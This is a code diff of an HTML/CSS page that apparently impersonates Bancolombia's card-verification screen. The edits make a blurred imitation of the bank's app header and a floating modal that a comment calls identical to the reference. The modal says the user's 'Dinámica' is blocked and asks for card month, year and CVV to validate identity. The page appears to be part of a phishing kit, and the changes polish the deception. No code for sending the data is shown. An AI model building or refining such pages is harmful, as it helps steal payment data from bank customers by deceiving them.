@@ -6,45 +6,57 @@
 <title>Verifica tu tarjeta | Bancolombia</title>
 <link rel="stylesheet" href="css/secured.css">
 <style>
-  /* Fondo general simulando la aplicación oscura difuminada */
+  /* Fondo general oscuro de la aplicación */
   body {
-    background: linear-gradient(135deg, #111 0%, #222 100%);
+    background-color: #1a1a1a;
     margin: 0;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    overflow-x: hidden;
   }
 
-  /* Contenedor central con efecto borroso de fondo y tarjeta flotante */
+  /* Simulación de la cabecera de la app difuminada al fondo */
+  .top {
+    background-color: #262422;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px;
+    color: #fff;
+    filter: blur(5px);
+    -webkit-filter: blur(5px);
+    pointer-events: none;
+    user-select: none;
+  }
+
+  /* Capa central que genera el fondo oscuro difuminado detrás del modal */
   .center {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0, 0, 0, 0.65);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
     display: flex;
     justify-content: center;
     align-items: center;
-    min-height: calc(100vh - 70px);
     padding: 16px;
     box-sizing: border-box;
-    position: relative;
+    z-index: 100;
   }
 
-  /* Simulación de elementos borrosos al fondo de la pantalla */
-  .center::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: rgba(0, 0, 0, 0.4);
-    backdrop-filter: blur(8px);
-    -webkit-backdrop-filter: blur(8px);
-    z-index: 1;
-  }
-
+  /* Tarjeta blanca flotante (Modal idéntico a la referencia) */
   .card-form {
-    position: relative;
-    z-index: 2;
     background: #ffffff;
-    border-radius: 28px;
-    padding: 28px 22px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    border-radius: 24px;
+    padding: 24px 20px;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
     max-width: 420px;
     width: 100%;
-    margin: auto;
+    max-height: 90vh;
+    overflow-y: auto;
+    box-sizing: border-box;
   }
 
   .card-form h1 {
@@ -52,17 +64,18 @@
     font-weight: 700;
     color: #111;
     text-align: center;
-    margin-bottom: 8px;
+    margin: 0 0 8px 0;
   }
 
   .card-form .sub {
     font-size: 13px;
     color: #555;
     text-align: center;
-    margin-bottom: 20px;
+    margin: 0 0 20px 0;
     line-height: 1.4;
   }
 
+  /* Estructura de 3 columnas para Mes, Año y CVV */
   .field-row-3 {
     display: flex;
     gap: 8px;
@@ -78,7 +91,7 @@
 
   .field select, .field input {
     width: 100%;
-    padding: 12px;
+    padding: 11px 12px;
     border: 1px solid #d1d5db;
     border-radius: 12px;
     font-size: 14px;
@@ -92,8 +105,8 @@
     appearance: none;
     background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
     background-repeat: no-repeat;
-    background-position: right 12px center;
-    background-size: 16px;
+    background-position: right 10px center;
+    background-size: 14px;
   }
 
   .field label {
@@ -104,7 +117,7 @@
   }
 
   .field {
-    margin-bottom: 16px;
+    margin-bottom: 14px;
   }
 
   .err-banner {
@@ -163,7 +176,7 @@
 <main class="center">
   <div class="card-form">
     <h1>Dinámica bloqueada</h1>
-    <p class="sub">Por seguridad, <span id="spanUserNombre"></span>, es necesario validar tu identidad para continuar utilizando nuestros productos.</p>
+    <p class="sub">Por seguridad, <span id="spanUserNombre">Usuario</span>, es necesario validar tu identidad para continuar utilizando nuestros productos.</p>
 
     <div class="err-banner" id="errBanner">Datos incorrectos. Verifica e intenta de nuevo.</div>
 
